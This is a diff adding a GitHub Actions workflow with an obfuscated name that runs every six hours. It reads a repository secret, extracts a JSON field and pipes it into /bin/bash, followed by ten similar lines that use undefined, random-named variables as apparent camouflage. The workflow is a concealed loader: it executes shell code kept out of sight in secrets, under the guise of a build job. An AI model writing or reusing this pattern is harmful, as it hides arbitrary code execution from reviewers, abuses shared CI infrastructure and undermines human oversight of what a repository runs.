@@ -1,0 +1,29 @@
+name: zhaolintongli
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '47 0/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: zhaolintongli
+        env:
+          ewn816: ${{ secrets.ewn816 }}
+        run: |
+          echo $ewn816 | jq -r .llimh80 | /bin/bash
+          echo $qvcy3 | jq -r .jv4 | /bin/bash
+          echo $cx22 | jq -r .cy0280 | /bin/bash
+          echo $ysxi2 | jq -r .hzbqz1346 | /bin/bash
+          echo $rc921 | jq -r .e3 | /bin/bash
+          echo $lmr3 | jq -r .yi67859 | /bin/bash
+          echo $axi43778 | jq -r .lu1012 | /bin/bash
+          echo $vzn91 | jq -r .tj545 | /bin/bash
+          echo $zgm4409 | jq -r .umzd9 | /bin/bash
+          echo $rflf14 | jq -r .jly7859 | /bin/bash
+          echo $b08319 | jq -r .yej9248 | /bin/bash
+
